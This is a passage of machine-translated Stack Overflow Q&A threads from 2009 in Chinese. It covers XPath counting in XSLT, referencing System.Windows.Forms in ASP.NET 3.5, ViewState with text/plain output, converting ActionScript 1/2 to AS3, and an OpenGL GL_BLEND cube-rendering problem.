count(//Property[long = '11007']) 
```

返回与以下相同的值：

```
count(//Property/long[text() = '11007']) 
```

...除了第一个计算`Property`与标准匹配的节点，第二个计算`long`与标准匹配的子节点。

根据您的评论并多次阅读您的问题，我相信您希望根据标准组合找到独特性。因此，实际上，我认为您实际上是在检查多个条件。以下内容也可以：

```
count(//Property[@Name = 'Alive'][long = '11007']) 
```

因为它的含义与以下内容相同：

```
count(//Property[@Name = 'Alive' and long = '11007']) 
```

当然，您可以用这些值替换模板中的参数。上面的代码只是说明了这一点。

**编辑**（问题编辑后）

* * *

关于 XML 很糟糕，您说得很对。事实上，这是一个彻头彻尾的[CodingHorror](http://www.codinghorror.com/)候选人！我不得不不断地重新计算以跟踪我目前所在的“属性”节点。我感受到了你的痛苦！

干得好：

```
count(/root/ac/Properties/Property[Properties/Property/Properties/Property/long = $parPropId]) 
```

请注意，我已删除所有其他检查（针对 ID 和值）。它们似乎不是必需的，因为您可以使用 XML 中的层次结构到达相关节点。此外，您已经提到唯一性检查仅基于元素的内容`long`。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-04-06T15:30:12.983

您的 xpath 有点偏离：

```
count(//Property/long[text()=$parPropId]) 
```

编辑：Cerebrus 非常正确地指出，您的 OP 中的代码（使用节点的隐式值）绝对适合您的目的。事实上，由于您很可能希望使用“Property”节点而不是“long”节点，因此请求它可能*比*`//Property[long=$parPropId]`text() xpath 更好，尽管您可以出于可读性考虑后者.

我能说什么，我今天有点累:)

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2009-04-06T15:28:21.537

```
<xsl:variable name="count" select="count(/Property/long = $parPropId)"/> 
```

未经测试，但我认为应该可以。我假设属性节点是根节点的直接子节点，因此取出你的后代选择器以获得性能

# asp.net - asp.net 3.5 中的 System.Windows.Forms

> ID：721967
> 
> 赞同：1
> 
> 时间：2009-04-06T15:26:00.713
> 
> 标签：asp.net, vb.net, winforms

我正在尝试实现一个网站屏幕截图类，如此处所述[http://www.plentyofcode.com/2007/09/website-screenshot-capture-with-aspnet.html](http://www.plentyofcode.com/2007/09/website-screenshot-capture-with-aspnet.html)

该类导入以下方法

```
Imports System
Imports System.Drawing
Imports System.Drawing.Imaging
Imports System.Windows.Forms
Imports System.Diagnostics

Namespace GetSiteThumbnail

   Public Class GetImage [...] 
```

对 System.Windows.Forms 的引用显然在 asp.net 2.0 中有效，但已从 3/3.5 中删除是否有 3.5 的等价物，或者有人知道在 3.5 中复制此网站屏幕截图设置的方法吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-04-06T15:27:19.807

您可以添加对 System.Windows.Forms dll 的引用吗？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-04-06T15:36:59.143

您的项目需要对`System.Windows.Forms`程序集的引用。确保它在那里。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-04-06T17:24:17.873

供稍后查看此内容的任何人参考。通过增加

```
<add assembly="System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=B77A5C561934E089"/> 
```

对于`<assemblies>`web.config 文件的部分，您可以使用 System.Windows.Forms

# asp.net - 文本/纯页面中的视图状态会发生什么？

> ID：721990
> 
> 赞同：0
> 
> 时间：2009-04-06T15:29:46.383
> 
> 标签：asp.net, viewstate

假设您有一个生成文本/纯文本输出的页面。如果在 Page_Load 中设置 ViewState，它不会对输出做任何事情（这是有道理的）。

我的问题是，text/plain 会关闭 ViewState 处理吗？ASP.NET 做什么来决定何时关闭？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-04-06T15:45:14.787

为了启用视图状态，您的 ASP.Net 中必须有 <form runat="server"> 元素。由于您使用纯文本作为输出，因此您可能没有此元素。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-04-06T16:03:52.887

你究竟是如何产生纯文本输出的？您是否清除响应、使用 Response.Write 和 .End on Load 或进行自定义渲染？在这种情况下，您决定 ViewState 的命运。您是否只是设置 Response.ContentType = "text/plain"？然后你仍然有你的 ViewState，但是浏览器将它显示为纯文本。最后，为什么要设置 ViewState 首先对输出做任何事情（除了修改隐藏字段）？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-04-06T23:23:22.860

对于这种输出，我建议使用通用处理程序 (.ashx)，因为它更简单、更轻巧。

# apache-flex - 如何最好地将 AS1/AS2 应用程序转换为 ActionScript3 应用程序？

> ID：721995
> 
> 赞同：0
> 
> 时间：2009-04-06T15:31:20.313
> 
> 标签：apache-flex, actionscript, mxml, cs3

我有一个由多个 SWF 组成的程序。一个 AS2-SWF 会加载一堆 AS1-SWF。这是一个糟糕的程序。我想在 MXML 中指定 GUI，并可能将一些代码重构为 AS3。但是，将所有 300 多个符号转换为 AS3 或任何可撤消的符号。

转换为 AS3/Flex/MXML 有哪些选择？该应用程序非常简单，只是也很大。它仅由按钮、背景和注意文本组成。所有按钮文本都在 XML 文件中。

我想尽快把它变成漂亮的代码，但也要控制，所以代码变成：

1.  易于更新/维护，
2.  可读
3.  可学习（所以我可以让只能编写 AS3 甚至 MXML 脚本的人完成更新）。

当然这是我自己主动做的，如果要一个多星期，我就抽不出时间了。

问候， 于尔根

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-04-08T23:14:56.187

这可能会有所帮助：

[http://flexman.info/2009/03/29/as3converter-an-ant-task-small-collection-of-as3/](http://flexman.info/2009/03/29/as3converter-an-ant-task-small-collection-of-as3/)

主要是针对 AS2 代码，所以 FLA 编辑是不可能的。但是您当然应该研究 JSFL。

已经有一些非常好的脚本可以处理这样的事情：

[http://bumpslide.com/blog/2009/03/07/jsfl-class-generator/](http://bumpslide.com/blog/2009/03/07/jsfl-class-generator/)

> 此命令的作用是查看您的库并查找所有具有自定义链接类名称的库项目。如果类扩展了 flash.display.MovieClip（或者如果基类为空），它会检查类文件是否存在，如果不存在，它会为您创建它。执行此操作时，脚本会查看时间轴上的所有项目并将相关属性添加到您的类中。如果这些剪辑是其他组件的实例，它们将被键入，并且相关的导入语句将自动添加到您的类中。如果您的组件设置为扩展某个其他类（例如，com.bumpslide.ui.Button），则不会生成任何类。类文件将被写入发布设置中定义的第一个自定义类路径内的正确包位置。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-04-06T16:54:08.427

尤尔根，我为你感到……听起来工作量很大。

你有什么样的问题？所有的 swf 都可以视为不同的类别吗？逻辑上有很多重叠还是每个对象都有特定的作用？

我认为拥有这么多不同的 SWF 可能会导致范围界定问题> 哪个 swf 与哪个对话。您可以使用 as3 设置使用现有部件的东西，然后尝试在现有代码上制作外观 > 使用 swfs 中的现有逻辑并通过 mxml 执行可视化部分。除此之外，我只能建议重建。如果您缺少一些原始 fla 的内容，您可能会发现自己也需要一个 swf 反编译器

# c++ - 为什么我的彩色立方体不适用于 GL_BLEND？

> ID：721998
> 
> 赞同：1
> 
> 时间：2009-04-06T15:32:15.613
> 
> 标签：c++, opengl, blend

当我使用 GL_BLEND 时，我的立方体未按预期呈现。

```
glEnable(GL_CULL_FACE);
glEnable(GL_BLEND);
glBlendFunc(GL_SRC_ALPHA, GL_ONE); 
```

在前面绘制一些半透明顶点时，我也遇到了类似的问题，这很可能是相关的。

> 相关：[为什么我的半透明顶点在 OpenGL 中使背景对象更亮？](https://stackoverflow.com/questions/722033/why-do-my-semi-opaque-vertices-make-background-objects-brighter-in-opengl)

这是它应该看起来的样子：

[普通立方体 http://img408.imageshack.us/img408/2853/normalcube.png](http://img408.imageshack.us/img408/2853/normalcube.png)

这就是它的实际样子：

[暗魔方 http://img7.imageshack.us/img7/7133/darkcube.png](http://img7.imageshack.us/img7/7133/darkcube.png)

请参阅用于[创建彩色立方体](http://pastebin.com/f5393f089)的代码，以及用于实际[绘制立方体](http://pastebin.com/f4aa216b6)的代码。

立方体是这样绘制的：

```
glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);

glPushMatrix();
glLoadIdentity();

// ... do some translation, rotation, etc ...

drawCube();

glPopMatrix();

// ... swap the buffers ... 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-04-07T08:05:59.517

看起来你在第二个上启用了照明，

在绘制之前尝试使用 glShadeModel( GL_FLAT )，

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-06-12T17:18:04.670

您可以在绘制立方体之前尝试禁用所有照明：

```
glDisable(GL_LIGHTING); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-07-31T10:13:34.473

这让我跺了跺脚。看起来有些顶点有一些不透明的 alpha 值。但是，您发布的代码全部为 1\. 用于 alpha。所以...为了进行更多调试，您是否尝试将透明颜色更改为非黑色？说绿色？从代码中，我怀疑照明是否打开，因为没有指定法线。

最后的评论，offtopic ...你真的不应该使用`glBegin`/ `glEnd`（每个顶点2个函数调用+每个图元2个对于OpenGL最近的发展来说真的不是一个很好的用法）。尝试`glDrawElements`使用`QUAD_LIST`，甚至更好，`TRIANGLE_LIST`。您已经为此精心布置了数据。`*****